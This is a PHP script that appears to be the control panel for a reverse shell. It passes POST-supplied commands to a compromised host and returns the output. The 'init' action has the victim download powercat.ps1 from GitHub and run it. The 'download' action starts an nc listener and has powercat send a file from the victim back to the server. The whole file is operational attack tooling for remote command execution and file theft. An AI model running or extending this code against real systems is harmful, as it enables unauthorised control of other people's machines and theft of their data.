<?php
$maxsleep = 5;
$fileTransferPort = 4243;
$outputfile = "../reverseresult";
$powercatFolder = ".";

function writeToReverseShell($cmd, $outputfile, $maxsleep){
    $newfile = $outputfile . "-old";
    if (!copy($outputfile, $newfile)) {
        echo "La copie $newfile du fichier a échoué...\n";
    }
    
    clearstatcache();
    $mtime = filemtime($outputfile);
    
    $handle = fopen("../cmd/command", 'w') or die('Cannot open file:  '.$my_file);
    fwrite($handle, $cmd);
    fclose($handle);      
    
    $sleepcount = 0;
    clearstatcache();
    
    while ($mtime == filemtime($outputfile) && ($sleepcount < $maxsleep)){
        $sleepcount ++;
        sleep(1);
        clearstatcache();
    }
    
    if ($sleepcount != $maxsleep){  
        // Faire le diff entre fichiers et le retourner
        $fulloutput = file_get_contents($outputfile);
        $oldoutput = file_get_contents($newfile);
        $result = str_replace($oldoutput, "", $fulloutput);
        return $result;
    } else {
        return "Shell took too long to respond";
    }
}

if (isset($_POST['action'])) {
    if(!is_file($outputfile)){
        $myfile = fopen($outputfile, "w+");
    }
    
    switch($_POST['action']){
        case "logs":
            echo file_get_contents($outputfile);
        break;
        case "write":
            if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                echo writeToReverseShell($_POST['command'], $outputfile, $maxsleep);
            }
        break;
        case "download":
            session_write_close();
            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/test.pdf &");
            sleep(1);
            $fileToDownload = "/home/pierre/Documents/psl_lrm.pdf";
            $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $fileToDownload . '}';
            $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
            fwrite($handle, $cmd);
            fclose($handle);  
            // echo "saving file";
        break;
        case "init":
            $cmd = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "./powercat.ps1"); . ./powercat.ps1';
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $powercatFolder = substr($result, 0, -2);
            echo $result;
    }
}
?>